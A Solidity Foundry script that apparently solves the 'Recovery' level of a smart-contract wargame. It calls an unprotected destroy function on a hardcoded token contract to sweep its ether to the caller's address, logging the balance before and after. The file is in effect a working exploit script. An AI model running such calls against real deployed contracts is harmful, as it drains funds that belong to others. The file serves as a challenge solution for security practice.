// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/17_Recovery.sol";

contract POC is Script {
    Recovery public target;
    SimpleToken public recovery_token;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        target = Recovery(0xB315f29f38253f7eb1563B5a6aD3E0Af17c5b1F9);
        recovery_token = SimpleToken(payable(0x31559A0e8AE853c11B198cF2c8741E1F73a1B43F));

        uint256 balance = address(recovery_token).balance;
        console.log("before balance: ", balance);

        recovery_token.destroy(payable(vm.envAddress("MY_ADDRESS")));

        balance = address(recovery_token).balance;
        console.log("after  balance: ", balance);

        vm.stopBroadcast(); 
    }
}